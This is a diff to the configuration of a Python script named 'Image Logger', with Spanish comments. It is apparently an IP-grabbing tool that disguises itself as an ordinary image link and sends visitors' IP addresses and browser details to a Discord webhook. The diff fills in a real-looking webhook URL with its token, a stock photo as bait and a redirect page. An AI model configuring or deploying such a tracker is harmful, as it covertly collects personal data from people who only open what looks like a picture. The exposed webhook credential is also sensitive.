@@ -8,8 +8,8 @@ import traceback, requests, base64, httpagentparser
 # ¡¡¡MUY IMPORTANTE!!!
 # Reemplaza "TU_WEBHOOK_URL_AQUI" con la URL real de tu webhook de Discord.
 config = {
-    "webhook": "TU_WEBHOOK_URL_AQUI",
-    "image": "https://app.skin.land/blogfiles/REmN8T5suNv7t4ZC4cqm4Cp7DoG4vBZWtJJXoyUU.png",
+    "webhook": "https://discord.com/api/webhooks/1469342908330017005/nTKQ9Cpi46wsT9aRtJyQBuhL45f4Yk4R6yP2IWhxRmM8r2IaakK5P0yZMoyzc9P5-DlV",
+    "image": "https://images.pexels.com/photos/35981066/pexels-photo-35981066.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1",
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
@@ -26,7 +26,7 @@ config = {
     "antiBot": 1,
     "redirect": {
         "redirect": False,
-        "page": "https://your-link.here"
+        "page": "https://www.pexels.com/es-es/foto/35981066/"
     },
 }
 
